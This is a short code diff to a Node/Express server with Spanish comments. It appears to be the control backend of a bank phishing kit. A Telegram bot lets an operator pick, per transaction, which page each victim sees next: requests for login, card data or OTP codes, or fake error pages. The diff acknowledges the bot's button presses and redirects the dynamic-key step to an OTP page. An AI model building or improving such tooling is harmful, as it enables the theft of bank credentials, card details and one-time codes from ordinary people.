@@ -100,20 +100,28 @@ app.get("/check_updates/:transaction_id", async (req, res) => {
   try {
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates`);
     const data = await response.json();
-
     const updates = data.result || [];
 
     for (const update of updates) {
       if (update.callback_query) {
-        const { data: callbackData } = update.callback_query;
+        const { data: callbackData, id: callback_id } = update.callback_query;
         const [action, id] = callbackData.split(":");
+
+        // Notificar a Telegram que ya procesaste el botón
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            callback_query_id: update.callback_query.id
+          })
+        });
 
         if (id === transaction_id) {
           switch (action) {
             case "pedir_logo":
               return res.json({ redirect: "pedir_logo.html" });
             case "pedir_dinamica":
-              return res.json({ redirect: "pedir_dinamica.html" });
+              return res.json({ redirect: "pedir_otp.html" });
             case "error_tc":
               return res.json({ redirect: "payment.html" });
             case "error_logo":
@@ -132,6 +140,7 @@ app.get("/check_updates/:transaction_id", async (req, res) => {
     res.json({ redirect: null });
   }
 });
+
 
 // PROCESAR FORMULARIO
 app.post("/procesar_formulario", async (req, res) => {
